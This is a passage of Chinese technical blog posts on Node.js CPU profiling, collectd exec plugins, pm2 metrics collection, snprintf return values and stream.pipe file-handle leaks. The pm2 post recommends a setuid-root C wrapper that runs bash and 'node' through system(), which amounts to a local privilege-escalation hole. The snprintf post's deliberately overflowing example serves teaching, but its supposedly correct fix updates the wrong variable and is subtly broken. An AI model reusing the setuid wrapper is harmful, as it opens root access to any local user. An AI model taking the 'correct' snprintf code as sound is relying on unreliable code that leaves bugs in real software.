     | 16 | 0 |    0 | 39729280 | 595424 | 7564076 |  0 |  0 |  0 |  5204 | 108933 | 23535 | 49 |  5 | 45 |  0 |  0 |
     | 18 | 0 |    0 | 39722832 | 595424 | 7568280 |  0 |  0 |  0 |  5276 | 111563 | 23965 | 51 |  5 | 44 |  0 |  0 |
     |----+---+------+----------+--------+---------+----+----+----+-------+--------+-------+----+----+----+----+----|
   #+end_example

   =sar=
   #+begin_example
     # sar -n TCP 1
     01:58:46 PM  active/s passive/s    iseg/s    oseg/s
     01:58:47 PM      3.09    875.26  32375.26  33619.59
     01:58:48 PM      0.00    575.25  27972.28  28961.39
     01:58:49 PM      0.00    879.59  31104.08  31933.67
     01:58:50 PM      1.02    743.88  30183.67  31516.33
     01:58:51 PM      0.00    793.94  31734.34  32761.62
     01:58:52 PM      0.00    571.88  28690.62  29415.62
     01:58:53 PM      1.02   1004.08  33157.14  33673.47
     01:58:54 PM      0.99    954.46  33315.84  34532.67
     01:58:55 PM      1.00    910.00  33562.00  34338.00
     01:58:56 PM      1.02    783.67  31754.08  32412.24
   #+end_example

** 应用状态

   =ps=
   #+begin_example
     # ps waux | grep node
     nobody   190790 61.0  1.4 1902228 974408 ?      Rl   Apr20 12154:57 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   190881 61.4  1.4 1907188 980800 ?      Rl   Apr20 12237:31 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   191463 61.8  1.5 1929392 1005164 ?     Sl   Apr20 12317:05 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   191515 61.7  1.5 1957252 1030472 ?     Rl   Apr20 12287:48 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   191609 61.1  1.4 1891508 967896 ?      Rl   Apr20 12183:27 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   192063 61.7  1.5 1951056 1025216 ?     Rl   Apr20 12300:27 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   192946 61.3  1.5 1943880 1017796 ?     Rl   Apr20 12204:24 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   193029 61.6  1.4 1871180 946732 ?      Rl   Apr20 12271:35 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   193068 60.9  1.5 1918404 993536 ?      Rl   Apr20 12124:33 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   193725 61.8  1.5 1929488 1001552 ?     Rl   Apr20 12316:31 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   194450 60.5  1.4 1887224 960012 ?      Sl   Apr20 12040:16 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   194523 59.9  1.4 1848960 924596 ?      Rl   Apr20 11928:46 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   195178 58.4  1.3 1838980 913052 ?      Rl   Apr20 11627:32 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   195276 58.5  1.3 1829848 905212 ?      Rl   Apr20 11639:08 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   195944 56.9  1.4 1859316 933892 ?      Rl   Apr20 11333:25 node /usr/local/xxx.xxxxxxxx.com/src/index.js
     nobody   196001 57.3  1.5 1930348 1004912 ?     Rl   Apr20 11408:17 node /usr/local/xxx.xxxxxxxx.com/src/index.js
   #+end_example

   =pm2=
   #+begin_example
     # pm2 desc xxx.xxxxxxxx.com | grep 'Loop delay'
     │ Loop delay │ 1.96ms │
     │ Loop delay │ 2.01ms │
     │ Loop delay │ 2.04ms │
     │ Loop delay │ 2.3ms  │
     │ Loop delay │ 1.76ms │
     │ Loop delay │ 1.97ms │
     │ Loop delay │ 2.12ms │
     │ Loop delay │ 1.98ms │
     │ Loop delay │ 2.16ms │
     │ Loop delay │ 1.98ms │
     │ Loop delay │ 2.07ms │
     │ Loop delay │ 1.88ms │
     │ Loop delay │ 2.61ms │
     │ Loop delay │ 1.84ms │
     │ Loop delay │ 1.84ms │
     │ Loop delay │ 1.88ms │
   #+end_example

** 分析

*** 系统负荷正常

    =top= 的 =load average= 值远小于 CPU 核数，系统的 CPU 使用率为 25%，还有足够的空闲 CPU 资源。

*** node.js 的 CPU 占用过高

    - 运行和等待 CPU 时间片的进程数偏高

      参见 =vmstat= 的 =r= 列


    - 中断数偏多

      参见 =vmstat= 的 =in= 列

      有可能是网络 I/O 数过多引起，参见 =sar= 的 =iseg/s= =oseg/s= 列。

      中断数虽多，但并非瓶颈，参见 =top= 的 =%hi= 和 =%si= 值。

      
    - 上下文切换较多

      参见 =vmstat= 的 =cs= 列

      上下文切换数远小于中断数，正常。


    - 用户模式下 CPU 占用过高
      
      超过 50%

      参见 =vmstat= 的 =us= 列

    - node.js 进程事件循环迟延小于 3ms

      正常。应用目前还能够提供快速响应。
    
    - node.js 进程 CPU 占用过高
      
      统计了一天平均占用 65%，高峰占用 85% 以上。

      参见 =ps= 输出
      
      应用本身是网络密集型，每 node.js 进程每秒钟处理 250 个请求，不存在 CPU 密集操作，这样高的 CPU 占用是不可接受的。
      
*** 网络带宽占用正常

    - 对外的网卡
      
      上行 27Mbps，下行 66Mbps

      主要是来自设备和客户端的流量。

    - 对内的网卡
      
      上行 18.7Mbps，下行 21.7Mbps
      
      主要是内部通信流量（redis）。

*** 磁盘访问较少

    应用除了写少量日志外不访问磁盘。

*** 结论

    - 系统资源不存在瓶颈

    - 系统当前的运行状况良好

    - node.js 应用的 CPU 占用偏高
      
      需要对 node.js 应用进行性能分析及优化

** node.js 应用性能分析

   node.js 从 4.4.0 版本开始内置了 profiler， =--prof= 命令选项运行应用会在当前目录生成性能日志文件。
   
   解读性能日志文件
   #+begin_example
     # node --prof-process isolate-0x1d1e1b0-v8-10041.log
     ...
     [Summary]:
        ticks  total  nonlib   name
         348    7.3%    7.6%  JavaScript
        4243   88.8%   92.4%  C++
          63    1.3%    1.4%  GC
         184    3.9%          Shared libraries
           2    0.0%          Unaccounted
     ...
      [C++ entry points]:
        ticks    cpp   total   name
         494   19.4%   10.3%  v8::internal::Runtime_DateCurrentTime(int, v8::internal::Object**, v8::internal::Isolate*)
     ...
        ticks parent  name
        1739   36.4%  syscall

         586   12.3%  __lll_lock_wait
         413   70.5%    v8::internal::Runtime_DateCurrentTime(int, v8::internal::Object**, v8::internal::Isolate*)
         398   96.4%      LazyCompile: *now native date.js:197:17
         305   76.6%        LazyCompile: *<anonymous> /usr/local/xxxxx.xxxxxxxx.com/src/models.js:43:30
     ...
   #+end_example

   最大头的时间花在系统调用上，通过 strace 工具统计 node.js 进程 10 秒钟的系统调用计数
   #+begin_example
       12259 write
       10501 read
        9261 epoll_ctl
        1564 epoll_wait
         503 close
         502 recvmsg
         502 getsockopt
         502 getsockname
         103 futex
          23 stat
           6 writev
           1 getpeername
   #+end_example

   系统调用主要进行网络 I/O ，如：与设备通信（TLS 长连接）、与客户端通信（HTTP 短连接）、与Redis通信（TCP 长连接）。

   其它调用出现次数最多的是获取当前时间戳的函数 models.js:43：
   #+begin_src js
     function getTimestamp () {
         return Math.floor(Date.now() / 1000);
     }
   #+end_src

   它会在很多地方被用到，如：当从 redis 收到一条订阅的消息时，会在消息中添加当前时间戳，方便后面处理。

   可以通过缓存减少这部分开销：
   #+begin_src js
     function getTimestamp () {
         if (! getTimestamp._timestamp) {
             getTimestamp._timestamp = Math.floor(Date.now() / 1000);

             setInterval(function () {
                 getTimestamp._timestamp = Math.floor(Date.now() / 1000);
             }, 1000).unref();
         }

         return getTimestamp._timestamp;
     }
     getTimestamp._timestamp = 0;
   #+end_src

   上面的代码，虽然调用次数相对较多，但并不耗 CPU，经过上面的优化后，总系统 CPU 占用只是略有减少。

   关键的系统调用消耗难以再优化，在我们的应用中，node.js 单实例处理能力的上限：4K TLS 长连接（平均 CPU 占用 85%）。

   最终决定，增加服务器上 node.js 进程的数量，node.js 最大连接数限制（ [[https://nodejs.org/api/net.html#net_server_maxconnections][net.maxConnections]] ）进一步减少。

** 参考

   [[http://www.ruanyifeng.com/blog/2011/07/linux_load_average_explained.html][理解Linux系统负荷 - 阮一峰的网络日志]]

   [[http://www.blogjava.net/sliverfancy/archive/2013/04/17/397947.html][Linux-Load Average解析(转) - java技术研究 - BlogJava]]   

   [[http://www.trueeyu.com/?p=1749][linux系统性能监控与优化（2）–cpu | 小鳄的笔记本]]

   [[https://nodejs.org/en/docs/guides/simple-profiling/][Easy profiling for Node.js Applications | Node.js]]

* DONE collectd exec 插件使用进阶                            :linux:collectd:
  CLOSED: [2016-05-05 Thu 12:44]

  前面一篇文章《[[http://blog.kankanan.com/article/4f7f7528-collectd-8fdb884c670d52a176d163a7.html][使用 collectd 进行服务监控 | 看看俺 – KanKanAn.com]]》展示了如何使用 collectd 的 exec 插件。

  要使收集的统计信息显示正常、易于使用，则需要对上报的数据有充分的理解。

** 数据的标识

   引用自 [[https://collectd.org/documentation/manpages/collectd-exec.5.shtml][man 5 collectd-exec]]
   #+begin_quote
       PUTVAL Identifier [OptionList] Valuelist
         Submits one or more values (identified by Identifier, see below) to the daemon which will dispatch it to all it's write-plugins.
  
         An Identifier is of the form "host/plugin-instance/type-instance" with both instance-parts being optional. If they're omitted the hyphen must be omitted, too. plugin and each instance-part may be chosen freely as long as
         the tuple (plugin, plugin instance, type instance) uniquely identifies the plugin within collectd. type identifies the type and number of values (i. e. data-set) passed to collectd. A large list of predefined data-sets is
         available in the types.db file. See types.db(5) for a description of the format of this file.
  
         The OptionList is an optional list of Options, where each option is a key-value-pair. A list of currently understood options can be found below, all other options will be ignored. Values that contain spaces must be quoted
         with double quotes.
  
         Valuelist is a colon-separated list of the time and the values, each either an integer if the data-source is a counter, or a double if the data-source is of type "gauge". You can submit an undefined gauge-value by using
         U. When submitting U to a counter the behavior is undefined. The time is given as epoch (i. e. standard UNIX time).
  
         You can mix options and values, but the order is important: Options only effect following values, so specifying an option as last field is allowed, but useless. Also, an option applies to all following values, so you
         don't need to re-set an option over and over again.
  
         The currently defined Options are:
  
         interval=seconds
             Gives the interval in which the data identified by Identifier is being collected.
  
         Please note that this is the same format as used in the unixsock plugin, see collectd-unixsock(5). There's also a bit more information on identifiers in case you're confused.
  
         Since examples usually let one understand a lot better, here are some:
  
           PUTVAL leeloo/cpu-0/cpu-idle N:2299366
           PUTVAL alice/interface/if_octets-eth0 interval=10 1180647081:421465:479194
   #+end_quote
 
   - =Identifier= 
     
     格式为 =host/plugin-instance/type-instance= 
     
     其中的 =-= 为分隔符， =instance= 部分是可省略（此时 =-= 也要省略）。
 
   - =host=
     
     主机名称，通常取自 =HOSTNAME= 环境变量。
 
   - =plugin= 
     
     插件名称。
 
   - =type=
     
     预定义的值类型名称，定义值的类型及数量，以及 collectd 服务会对值做何处理（如：按时间间隔平均化）。
 
     参考 [[https://collectd.org/documentation/manpages/types.db.5.shtml][man 5 types.db]] [[https://collectd.org/wiki/index.php/Data_source][Data source - collectd Wiki]]

     如某个上报的统计指标在网页上没有对应的图表产生，请检查 collectd 服务器与客户机上 types.db，数据集必须定义且一致，上报的值必须符合数据集定义。
     服务器或客户端安装的 collectd 可能版本较低，附带的 types.db 中缺少第三方插件要求的数据集定义，运营人员改动 types.db 中 memory 类型也会导致上报失败：
     #+begin_example
       # memory         value:GAUGE:0:281474976710656
       memory          free:GAUGE:0:281474976710656, buffered:GAUGE:0:281474976710656, used:GAUGE:0:281474976710656, cached:GAUGE:0:281474976710656
     #+end_example


** 数据的展示

   数据由上到下分级展示。

   - 主机列表
 
     选择要查看的主机，对应上面的 =host=
 
   
   - 插件列表
 
     选择要查看的插件，对应上面的 =plugin=
 
     
   - 统计图表列表页
 
     插件实例（ =plugin instance= ）+类型（ =type= ）产生一张图表，类型实例（ =type instance= ）对应图标上的一条曲线。


   - 统计图表详情页

     点击统计图表列表页上的图表进入统计图表详情页，此时可以选择统计的时间范围（如：按小时、天、周、月、年）。

     另外可以聚合显示所有主机上的相同统计图表，以便进行交叉对比。

** 标识的使用

   上报数据时，我们拥有极大的自由性，而 collectd 会宽容地接受并展示结果，但是为了让最终的结果有用、易用，我们需要正确地指定上报的信息项。

   - =host=

     应该填写主机名称，当我们需要整个服务（包括多台主机）的统计时，可以借助 collectd 界面提供的聚合功能实现。


   - =plugin=

     插件名称

   - =plugin instance=

     插件实例，对应插件收集一个统计指标名称，如：memory。

     对于简单的插件（只收集一个统计指标），则可以直接省略插件实例（plugin instance）部分，插件名称命名使用统计指标名称。

   - =type=

     请在 types.db 中预定义的类型中选择。

   - =type instance=

     对于主机上的唯一统计指标（如：load），就不需要使用 =type instance= 了，如果是主机上的非唯一统计指标（如：各分区使用率、进程 cpu 占用率等），则可以使用 =type instance= 来区分（如：填写为分区路径、进程名称等）。

     多个 =type instance= 会在同一张图表中各使用一条曲线展示，如果放在一起展示没有意义，则可能更适合使用 =plugin instance= 进行标识。

** 突破 root 帐号限制

   引用自 [[https://collectd.org/documentation/manpages/collectd-exec.5.shtml][man 5 collectd-exec]]
   #+begin_quote
   CAVEATS
       ·   The user, the binary is executed as, may not have root privileges, i. e.  must have an UID that is non-zero. This is for your own good.
   #+end_quote

   Exec 插件不允许以 root 权限执行。

   - 温和的解决办法

     引用自 [[https://collectd.org/wiki/index.php/Plugin:Exec][Plugin:Exec - collectd Wiki]]
     #+begin_quote
     The security concerns are addressed by forcing the plugin to check that custom programs are never executed with superuser privileges. If the daemon runs as root, you have to configure another user ID with which the new process is created. To circumvent missing access privileges to files, you need to lean on the unix group concept. I.e. your script requires access to /var/log/messages, which is owned by root, its common practice to have this file being group readable by the admin-group. Given the used ID corrosponds to MyWatcherUser, you need to add that user to the admin group via /etc/group (or what else manages users / groups on your system). 
     #+end_quote

     将原本需要 =root= 才能访问的文件，改变属组（ =group= ）为 =admin= ，权限为 =group= 可读，然后将插件账号的 =group= 也改为 =admin= 。
     
   - 暴力的解决方法
     
     利用 =setuid= ，允许可执行程序以 =root= 身份运行。

     参考
     [[http://blog.kankanan.com/article/linux-4e0b51418bb8666e901a752862376267884c97008981-root-674396507684547d4ee4.html][linux下允许普通用户执行需要root权限的命令 | 看看俺 – KanKanAn.com]]

* DONE 使用 collectd 监控 pm2 应用性能                    :collectd:node:pm2:
  CLOSED: [2016-05-05 Thu 16:45]

  [[https://github.com/Unitech/pm2][pm2]] 是 node.js 应用的产品级进程管理器。

  #+begin_quote
  PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.
  #+end_quote

** 关键性能指标

   通过 [[https://github.com/Unitech/pm2][pm2]] 可以获取到 node.js 应用的几个关键性能指标：

   - Memory used
 
     node.js 应用的内存占用。
     
     node.js（v8） 通过垃圾收集（GC）技术进行自动内存管理，这里测量到的内存占用还包含一部分未回收的垃圾。
 
   - CPU used
     
     node.js 应用的 CPU 占用。
     
     node.js 是单线程模型，虽然所有 I/O 操作是异步的，但是代码指令执行是同步的，过多的请求处理或消耗 CPU 的操作会导致应用响应速度变慢，可能无法提供正常的服务。
 
   - Loop delay
 
     node.js 应用事件循环的延迟。
 
     pm2 测量 node.js 应用 Loop delay 的逻辑如下：
 
     #+begin_quote
        记下开始时间（ process.hrtime ）
     
        设置 1 秒钟的定时器（setInterval）
     
        定时器触发时获取结束时间（ process.hrtime ）
     
        结束时间与开始时间的时间差减去 1 秒钟就是 Loop delay
     #+end_quote
     具体实现请查阅 pm2 源代码：node_modules/pm2/node_modules/pmx/lib/probes/pacemaker.js

 
     一般来说 =Loop delay= 与 =CPU used= 指标是正相关的，但是如果 node.js 应用不小心调用了一些同步 I/O 操作或 I/O 出现瓶颈，则会出现 =CPU used= 低但是 =Loop delay= 高的情况。
 
   - restart_time 及 unstable_restarts
 
     node.js（javascript）是一门动态语言，很少运行到的代码分支里一个错误的变量引用就可能导致整个应用异常退出，pm2 会在 node.js 应用退出时自动重新拉起应用，
     但这可能会掩盖潜藏的问题（BUG），监控 node.js 应用的重启次数可以及时发现这种问题（BUG）。
 
   上线新代码后，通过观测这几个关键性能指标，以及与历史记录进行对比，可以用来评估新代码的运行效率与质量。

** 收集性能指标

   通过 pm2 收集 node.js 应用性能指标的脚本 =/usr/local/bin/collectd-pm2.js=
   #+begin_src js
     var os = require('os');
     var exec = require('child_process').exec;


     var hostname = process.env.COLLECTD_HOSTNAME || os.hostname();
     var interval = parseInt(process.env.COLLECTD_INTERVAL, 10) || 1;

     function collect () {
         exec('pm2 jlist', function (error, stdout, stderr) {
             if (error) {
                 process.stderr.write(error.toString());
                 process.exit(1);
             }

             if (stderr) {
                 process.stderr.write(stderr.toString() + "\n");
             }

             var timestamp = Math.floor(Date.now() / 1000);
             var list = JSON.parse(stdout);
             list.forEach(function (item) {
                 var name = '';
                 for(var i = 0, n = item.name.length; i < n; ++i) {
                     name += item.name[i].match(/^[0-9a-zA-Z]+$/) ? item.name[i] : '_';
                 }
                 process.stdout.write("PUTVAL \"" + hostname + "/" + name + "-loop_delay" + "/delay-" + item.pm_id + "\" interval=" + interval + " " + timestamp + ":" + item.pm2_env.axm_monitor["Loop delay"].value.replace('ms', '') + "\n");
                 process.stdout.write("PUTVAL \"" + hostname + "/" + name + "-memory_used" + "/gauge-" + item.pm_id + "\" interval=" + interval + " " + timestamp + ":" + item.monit.memory + "\n");
                 process.stdout.write("PUTVAL \"" + hostname + "/" + name + "-cpu_used" + "/gauge-" + item.pm_id + "\" interval=" + interval + " " + timestamp + ":" + item.monit.cpu + "\n");
                 process.stdout.write("PUTVAL \"" + hostname + "/" + name + "-restart_time" + "/gauge-" + item.pm_id + "\" interval=" + interval + " " + timestamp + ":" + item.pm2_env.restart_time + "\n");
                 process.stdout.write("PUTVAL \"" + hostname + "/" + name + "-unstable_restarts" + "/gauge-" + item.pm_id + "\" interval=" + interval + " " + timestamp + ":" + item.pm2_env.unstable_restarts + "\n");
             });

             setTimeout(collect, interval*1000);
         });
     }

     collect();
   #+end_src
 
   pm2 是使用 root 帐号运行的，collectd exec 插件不允许以 root 权限运行收集统计的程序（collectd-pm2.js），一个简单的方法是用 c 写一个包裹程序，使用 =setuid= 切换到 root 帐号。
 
   =collectd-pm2-root.c=
   #+begin_src c
     #include <stdio.h>
     #include <sys/types.h>
     #include <sys/stat.h>
     #include <sys/wait.h>
     #include <unistd.h>
     #include <stdlib.h>
     #include <signal.h>
     #include <string.h>


     int main(int argc, char* argv[]) {
         if (setuid(0) == -1 || setgid(0) == -1) {
             perror("setuid or setgid to root user error");
             fprintf(stderr, "\npermit setuid and setgid to root user: \n\tchown root:root %s\n\tchmod 4755 %s\n", argv[0], argv[0]);
             return EXIT_FAILURE;
         }

         return system("/bin/bash -c 'export PM2_HOME=${PM2_HOME:-~root/.pm2}; node /usr/local/bin/collectd-pm2.js'");
     }
   #+end_src
   
   编译安装
   #+begin_src sh
     gcc -O2 collectd-pm2-root.c -o collectd-pm2-root
     cp collectd-pm2-root /usr/local/bin
     chown root:root /usr/local/bin/collectd-pm2-root
     chmod 4755 /usr/local/bin/collectd-pm2-root
   #+end_src

   配置 collectd，修改 =collectd.conf=
   #+begin_example
     LoadPlugin exec
 
     <Plugin exec>
         Exec "nobody:nobody" "/usr/local/bin/collectd-pm2-root"
     </Plugin>
   #+end_example

   测试运行统计收集脚本
   #+begin_src sh
     sudo -u nobody -g nobody /usr/local/bin/collectd-pm2-root
   #+end_src

   重启 collectd 生效即可。
   
   以上代码已在 github 开源：[[https://github.com/tangxinfa/collectd-pm2]] 。

* DONE collectd 数据类型详解                                       :collectd:
  CLOSED: [2016-05-07 Sat 15:07]

  [[https://collectd.org/documentation/manpages/collectd-exec.5.shtml][man 5 collectd-exec]]
  #+begin_quote
  type identifies the type and number of values (i. e. data-set) passed to collectd. A large list of predefined data-sets is available in the types.db file. See types.db(5) for a description of the format of this file.
  #+end_quote
  #+begin_quote
  type 标识传给 collectd 的值的类型和数量（即数据集）。types.db 中预定义了大量数据集（data-sets）。types.db 的格式描述可以查看 types.db(5) 手册。
  #+end_quote

  [[https://collectd.org/documentation/manpages/types.db.5.shtml][man 5 types.db]]
  #+begin_quote
  The types.db file contains one line for each data-set specification. Each line consists of two fields delimited by spaces and/or horizontal tabs. The first field defines the name of the data-set, while the second field defines a list of data-source specifications, delimited by spaces and, optionally, a comma (",") right after each list-entry.

  The format of the data-source specification has been inspired by RRDtool's data-source specification. Each data-source is defined by a quadruple made up of the data-source name, type, minimal and maximal values, delimited by colons (":"): ds-name:ds-type:min:max. ds-type may be either ABSOLUTE, COUNTER, DERIVE, or GAUGE. min and max define the range of valid values for data stored for this data-source. If U is specified for either the min or max value, it will be set to unknown, meaning that no range checks will happen. See rrdcreate(1) for more details.
  #+end_quote
  #+begin_quote
  types.db 文件每行定义一种数据集（data-set），为空格或水平制表符分隔的两个字段。第一个字段定义数据集名称，第二字段定义数据源规格列表，列表条目用空格或逗号分隔。

  数据源规格受到 RRDtool 启发。每一数据源定义为四元组，依次是名称、类型、最小值、最大值，使用冒号分隔：ds-name:ds-type:min:max。ds-type 可取 ABSOLUTE、COUNTER、DERIVE、GAUGE 之一。min 和 max 定义有效的取值范围，可以指定 min 或 max 为未知 U，表示不检查取值范围。查阅 rrdcreate(1) 手册了解更多。
  #+end_quote

  [[https://collectd.org/wiki/index.php/Data_source][Data source - collectd Wiki]]
  #+begin_quote
  Data source types

  There are four data source types which are basically identical to the data source types of the same name in RRDtool:

  GAUGE
  
      A GAUGE value is simply stored as-is. This is the right choice for values which may increase as well as decrease, such as temperatures or the amount of memory used.
  
  
  DERIVE
  
      These data sources assume that the change of the value is interesting, i.e. the derivative. Such data sources are very common with events that can be counted, for example the number of emails that have been received by an MTA since it was started. The total number of emails is not interesting, but the change since the value has been read the last time. The value is therefore converted to a rate using the following formula:

          rate = (value_new - value_old) / (time_new - time_old)

      Please note that if value_new < value_old, the resulting rate will be negative. If you set the minimum value to zero, such data points will be discarded. Using DERIVE data sources and a minimum value of zero is recommended for counters that rarely overflow, i.e. wrap-around after their maximum value has been reached. This data source type is available since version 4.8.
  
  
  COUNTER
  
      These data sources behave exactly like DERIVE data sources in the “normal” case. Their behavior differs when value_new < value_old, i.e. when the new value is smaller than the previous value. In this case, COUNTER data sources will assume the counter “wrapped around” and take this into account. The formula for wrap-around cases is:

          rate = (2**width - value_old + value_new) / (time_new - time_old)
          width = value_old < 2**32 ? 32 : 64

      Please note that the rate of a COUNTER data source is never negative. If a counter is reset to zero, for example because an application was restarted, the wrap-around calculation may result in a huge rate. Thus setting a reasonable maximum value is essential when using COUNTER data sources. Because of this, COUNTER data sources are only recommended for counters that wrap-around often, for example 32 bit octet counters of a busy switch port.
  

  ABSOLUTE
  
      This is probably the most exotic type: It is intended for counters which are reset upon reading. In effect, the type is very similar to GAUGE except that the value is an (unsigned) integer and will be divided by the time since the last reading. This data source type is available since version 4.8 and has been added mainly for consistency with the data source types available in RRDtool.
  #+end_quote
  #+begin_quote
  数据源类型

  源自 RRDtool 的四种数据源类型：

  GAUGE
  
      GAUGE 意为计量，其值简单地原样存储。用于可增减的值，如：温度或费用支出。

  
  DERIVE
  
      DERIVE 意为导数，关注值的变动，即导数。
      这样的数据源通常为可计数的事件，如：邮件客户端启动后收到的邮件数。
      相对于收件箱里的邮件总数，上次查看邮箱后新收到的邮件数量更值得关注。
      该值可以根据以下公式转化为速率：

          rate = (value_new - value_old) / (time_new - time_old)

      如果 value_new 小于 value_old，得出的 rate 为负。
      如果设置最小值（min）为 0 ，这个数据点将被丢弃。
      对于很少溢出（即达到最大值后回绕）的计数器推荐使用 DERIVE 数据源并设置最小值（min）为 0。
      DERIVE 类型从 4.8 版本开始提供。
  
  
  COUNTER
  
      COUNTER 意为计数器，”正常“情况下与 DERIVE 一样。
      细微的差异在于当 value_new 小于 value_old 时，COUNTER 数据源类型假设计数器已经“回绕”，计算速率的公式：

          rate = (2**width - value_old + value_new) / (time_new - time_old)
          width = value_old < 2**32 ? 32 : 64

      COUNTER 数据源类型计算出的速率（rate）值不为负。
      如果计数器被重置为 0，如当应用程序重启后，回绕计算可能导致结果为巨大的速率（rate）。
      当使用 COUNTER 数据源时，必须设置一个合理的最大值（max）。
      因此，COUNTER 数据源仅推荐用于常常会回绕的计数器，例如，繁忙的交换机端口的 32 位字节计数器。
  

  ABSOLUTE
  
      ABSOLUTE 意为绝对，可能是最特殊的类型：用于读取后会重置的计数器。
      效果上，它和 GAUGE 类型非常相似，除了它的值是无符号整型，还要与上次读取至今的时间相除。

      这个数据源类型从 4.8 版本开始提供，主要是为了和 RRDtool 保持一致。
  #+end_quote

  - 数据集（Data Set）

    传递到 collectd 的数据的定义，如 types.db 中的一条：
    #+begin_example
      load            shortterm:GAUGE:0:5000, midterm:GAUGE:0:5000, longterm:GAUGE:0:5000
    #+end_example

    以上定义了一种数据集，名为 load，包括三个值：shortterm、midterm、longterm，这三个值的类型都是 GAUGE，取值范围 0-5000。

    详情参见 [[https://collectd.org/wiki/index.php/Data_set][Data set - collectd Wiki]]

  - 数据源（Data Source）

    就是数据集（Data Set）的值定义，为名称、类型、最小值、最大值四元组。

  - 数据源类型（Data Source Type）
    
    就是数据源中的类型字段，共有四种类型：ABSOLUTE、COUNTER、DERIVE、GAUGE。

** 示例

   以下 collectd-exec 插件示例脚本用到了 load 数据集
   #+begin_example
     #!/bin/bash

     HOSTNAME="${COLLECTD_HOSTNAME:-localhost}"
     INTERVAL="${COLLECTD_INTERVAL:-60}"

     while [ 1 ]; do
         echo "PUTVAL \"$HOSTNAME/test_load/load\" interval=$INTERVAL N:1:2:3"
         sleep "$INTERVAL"
     done
   #+end_example

   插件名称 =test_load= ，数据类型（数据集）为 =load= ， =N= 代指当前时间，shortterm、midterm、longterm 的值分别为 1、2、3。

* DONE 你很可能不懂 snprintf                                              :c:
  CLOSED: [2016-05-13 Fri 20:36]

  Q: =snprintf= 返回的是实际写入到缓冲区的字符数吗？

  A: 错。当缓冲区空间不足时会返回比缓存区空间大的值。

** man 3 snprintf

   摘录关键部分

   原型写义
   #+begin_quote
       #include <stdio.h>

   
       int sprintf(char *str, const char *format, ...);
   
       int snprintf(char *str, size_t size, const char *format, ...);
   #+end_quote

   功能描述
   #+begin_quote
       The functions in the printf() family produce output according to a format as described below.  The functions
       printf()  and  vprintf()  write output to stdout, the standard output stream; fprintf() and vfprintf() write
       output to the given output stream; sprintf(), snprintf(), vsprintf() and vsnprintf() write to the  character
       string str.

       The function dprintf() is the same as fprintf(3) except that it outputs to a file descriptor, fd, instead of
       to a stdio stream.

       The functions snprintf() and vsnprintf() write at most size  bytes  (including  the  terminating  null  byte
       ('\0')) to str.
   #+end_quote

   返回值
   #+begin_quote
       Upon  successful  return,  these  functions return the number of characters printed (excluding the null byte
       used to end output to strings).

       The functions snprintf() and vsnprintf() do not write more than size bytes (including the  terminating  null
       byte ('\0')).  If the output was truncated due to this limit, then the return value is the number of charac‐
       ters (excluding the terminating null byte) which would have been written to the final string if enough space
       had  been  available.   Thus, a return value of size or more means that the output was truncated.  (See also
       below under NOTES.)

       If an output error is encountered, a negative value is returned.
   #+end_quote

** 了解 snprintf

   sprintf 输出到缓冲区，提供的缓存区空间不足时，引发臭名昭著的 =缓存区溢出= 漏洞，snprintf 通过指定缓存区空间大小解决了这个问题。
   
   snprintf 常用于字符串格式化（如：拼接 SQL 或 shell 命令），很多人会用它的返回值来指定下一次拼接的起始位置。

   如下代码所示：
   #+begin_src c
     const char* fields[] = {
         "name",
         "age",
         "city"
     };

     char sql[10] = "select ";
     int pos = 0;

     for(int i = 0; i < sizeof(fields)/sizeof(fields[0]); ++i) {
         pos += snprintf(sql + pos, sizeof(sql) - pos, "%s%s", (i ? ", " : ""), fields[i]);
     }

     snprintf(sql + pos, sizeof(sql) - pos, " from users");
   #+end_src

   上面的代码没有处理缓存区不足的问题，最坏的结果仅仅是因缓存区空间不足而导致 sql 不完整吗？

   比那要严重多了，它还会导致”缓存区溢出“漏洞。

   这是因为，当缓冲区尺寸不足时，snprintf 会返回比缓冲区尺寸大的值，最后会导致传给 snprintf 的缓存区尺寸值为负数，
   转化为无符号整型（size_t）就是一个超大的整数值。

** 使用 snprintf 的正确姿势

   #+begin_src c
     int pos = 0;
     int n = snprintf(buffer + pos, sizeof(buffer) - pos, "%s", "hello");
     if (n >= sizeof(buffer) - pos) {
         // a return value of size or more means that the output was truncated
         fprintf(stderr, "error: buffer size not enough\n");
         return;
     }
     n += pos;

     n = snprintf(buffer + pos, sizeof(buffer) - pos, "%s", " snprintf");
     if (n >= sizeof(buffer) - pos) {
         // a return value of size or more means that the output was truncated
         fprintf(stderr, "error: buffer size not enough\n");
         return;
     }
     n += pos;
   #+end_src

   下次在代码里，当你看到有人用 snprintf 进行”漂亮“的拼接，相信你会从”哇“改口为”操“了。

* DONE 关于 stream.pipe 你需要知道更多                                 :node:
  CLOSED: [2016-05-22 Sun 01:58]

** 关于 stream 用法的一个经典例子

   #+begin_src js
     var http = require('http');
     var fs = require('fs');

     var server = http.createServer(function (req, res) {
         var stream = fs.createReadStream(__dirname + '/data.txt');
         stream.pipe(res);
     });
     server.listen(8000);
   #+end_src

** 经典例子的致命问题

   如果用户中断下载，文件不会关闭，导致文件句柄（fd）泄露，参见相关讨论：

   [[http://stackoverflow.com/questions/37317676/deleting-file-in-node-js-not-working][express - Deleting file in node.js not working - Stack Overflow]]

   修复如下
   #+begin_src js
     var http = require('http');
     var fs = require('fs');

     var server = http.createServer(function (req, res) {
         var stream = fs.createReadStream(__dirname + '/data.txt');
         stream.pipe(res).once('close', function () {
             stream.destroy();
         });
     });
     server.listen(8000);
  #+end_src
  stream.destroy（同 stream.close） 是一个未文档化的 API，来自 fs.ReadStream ，
  如此重要的一个函数竟然未文档化（至少现在还是未文档化状态，当前 node.js 版本为 v6.2.0）。

